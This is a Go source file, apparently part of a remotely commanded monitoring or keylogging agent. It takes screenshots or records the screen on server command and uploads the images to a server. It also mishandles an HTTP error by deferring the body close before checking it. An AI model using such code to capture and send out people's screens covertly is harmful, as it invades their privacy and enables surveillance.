package internal

import (
	"encoding/json"
	"io/ioutil"
	"log"
)

// KeyLogger commands Observer
type ScreenshotCmdObserver struct {
	recorder         *ScreenRecorder
	recordingChannel chan *Screenshot
	sendShotCmd      *SendFileCommand
	respondServerCmd *RespondServerCommand
}

func (o *ScreenshotCmdObserver) execute(string_json string) {
	var req ScreenRequest
	err := json.Unmarshal([]byte(string_json), &req)

	if err != nil {
		log.Println("Not a screen parse request")
		return
	}

	if req.Cmd != "screen" {
		return
	}

	log.Println("ScreenshotCmdObserver: command received:", string_json)

	switch req.Action {
	// Recording screen operations
	case "record":

		switch req.Action_status {
		case "start":
			seconds := req.Seconds

			// TODO: implement recording by number of seconds requested
			_ = seconds

			// Starts recording in a folder
			o.startRecording()
			break

		case "stop":
			// Stops recording
			o.stopRecording()
			break
		}

		break

	// Take only one shot
	case "screenshot":
		shot := o.shot()
		if shot == nil {
			// Prepare response
			shotnotification := ScreenshotNotification{}
			shotnotification.Err = true
			shotnotification.Errmsg = "Couldn't take screenshot"

			_ = shotnotification
			// TODO: analyze if an answer must be emitted
			// o.respondServerCmd.SendScreenshotNotification(shotnotification)

			break
		}

		// POST screenshot
		res, err := o.sendShotCmd.Send(shot.FilePath)
		defer res.Body.Close()
		if err != nil {
			// Prepare ERROR response
			shotnotification := ScreenshotNotification{}
			shotnotification.Reqid = req.Reqid
			shotnotification.Err = true
			shotnotification.Errmsg = err.Error()

			o.respondServerCmd.SendScreenshotNotification(shotnotification)
			break
		}

		// Prepare OK response
		data, _ := ioutil.ReadAll(res.Body)
		shotId := string(data)

		shotnotification := ScreenshotNotification{}
		shotnotification.Reqid = req.Reqid
		shotnotification.Err = false
		shotnotification.Id = shotId
		shotnotification.Filename = shot.FileName

		// Notify server that it received the image POSTed,
		// related with the request id
		errr := o.respondServerCmd.SendScreenshotNotification(shotnotification)

		// TODO: delete this
		if errr != nil {
			strres, _ := json.Marshal(shotnotification)
			log.Println("ScreenshotCmdObserver: responded: ", string(strres))
			break
		}

		log.Println("Service notified about screenshot")

		break
	}
}

func (o *ScreenshotCmdObserver) startRecording() {
	o.recordingChannel = make(chan *Screenshot)

	go func() {
		o.recorder.StartCapturing(o.recordingChannel)

		for {
			shot := <-o.recordingChannel
			log.Printf("SHOT (%s)%s - %s \n", shot.FileGroup, shot.FileName, shot.FilePath)
		}
	}()
}

func (o *ScreenshotCmdObserver) stopRecording() {
	o.recorder.StopCapturing()
}

func (o *ScreenshotCmdObserver) shot() *Screenshot {
	// Set 'tmp' as group for the folder
	// This folder must be temporary; holds only
	// screenshots requested
	return o.recorder.ScreenShot("tmp")
}

func NewScreenshotCmdObserver(recorder *ScreenRecorder, sendShotCmd *SendFileCommand, respondServerCmd *RespondServerCommand) *ScreenshotCmdObserver {
	return &ScreenshotCmdObserver{
		recorder:         recorder,
		sendShotCmd:      sendShotCmd,
		respondServerCmd: respondServerCmd,
	}
}
